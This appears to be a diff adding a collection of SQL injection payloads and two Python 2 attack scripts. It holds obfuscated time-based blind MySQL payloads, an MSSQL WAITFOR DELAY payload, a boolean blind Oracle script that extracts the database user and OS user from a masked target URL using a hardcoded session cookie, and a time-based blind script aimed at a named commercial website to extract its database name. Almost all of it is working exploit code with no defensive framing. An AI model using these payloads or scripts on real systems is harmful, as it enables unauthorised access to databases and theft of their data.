@@ -1,0 +1,150 @@
+%2527aND(1=if(length/**/(database/**/())=12,1,benchmark/**/(7000000,md5(1))))aND%25271%2527=%25271
+
+%2527aND(1=if(ascii/**/(substr(database/**/()+from+1+for+1))>106,1,benchmark/**/(7000000,md5(1))))aND%25271%2527=%25271
+
+(if(1=2,sleep(5),2))
+
+### oracle
+#!/usr/bin/env python
+
+# -*- coding: utf-8 -*-
+
+# @Author: 
+
+
+
+import requests
+
+url = "http://**.**.**.**/wcm/cm_ly/goToLycont.action?fhtype=1&id=8a4ac70250f05d9e0151590e127808da"
+
+payloads='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789@_.'
+
+header = {
+
+			"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
+
+			"Cookie":"JSESSIONID=5V1JXjMpQLtR92RxJ62KrMQLfY4t6xpdQCBfcXLHtT2yz4jsT7Gr!1478879510",
+
+			"Accept":""
+
+		}
+
+def getData():
+
+	user=''
+
+	for i in range(1,4,1):
+
+		for exp in list(payloads):
+
+			try:
+
+				payload = "'AND substr(SYS_CONTEXT('USERENV','CURRENT_USER'),%s,1)='%s' AND 'xxx'='xxx" % (i,''.join(exp))
+
+				r = requests.get(url + payload,headers=header,allow_redirects=False,timeout=100)
+
+				res = r.text
+
+				#print exp
+
+				if res.find("20151130234113") >0 :
+
+					user+=exp
+
+					print '\n user is:',user,
+
+			except:
+
+				pass
+
+	print '\n[Done] Oracle user is %s' %user
+
+	
+
+def getDataBase():
+
+	user=''
+
+	for i in range(0,13,1):
+
+		for exp in list(payloads):
+
+			try:
+
+				payload = "'AND substr(SYS_CONTEXT('USERENV','OS_USER'),%s,1)='%s' AND 'xxx'='xxx" % (i,''.join(exp))
+
+				r = requests.get(url + payload,headers=header,allow_redirects=False,timeout=100)
+
+				res = r.text
+
+				#print exp
+
+				if res.find("20151130234113") >0 :
+
+					user+=exp
+
+					print '\n OS_USER is:',user,
+
+			except:
+
+				pass
+
+	print '\n[Done] Oracle OS_USER is %s' %user
+
+if __name__ == '__main__':
+
+	#len = getLength()
+
+	getData()
+
+	getDataBase()
+
+Sql Server:@@rowcount MySql:last_insert_id() oracle:bitand(1,1)
+
+
+
+#!/usr/bin/env python
+
+# encoding: utf-8
+
+# vip_new.py 
+
+# ringzero@0x557.org
+
+
+
+import requests
+
+import time
+
+import sys
+
+
+
+reload(sys)
+
+sys.setdefaultencoding('utf-8')
+
+
+
+payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')
+
+
+
+for i in range(1,20):
+
+    for _str in payloads:
+
+        start_time = time.time()
+
+        url = "http://share.vip.com/Acts/SetCount?id=63200' AND (SELECT * FROM (SELECT(SLEEP((ASCII(MID(LOWER(DATABASE())," + str(i) + ",1))=" + str(ord(_str)) + ")*5)))RING) AND 'RING'='RING"
+
+        result = requests.get(url).text
+
+        if(time.time() - start_time) > 3:
+
+            print _str
+
+            break
+
+;If(1234 nOt bETweEn 0 aND 123) WAITFOR DELAY '0:0:10'--
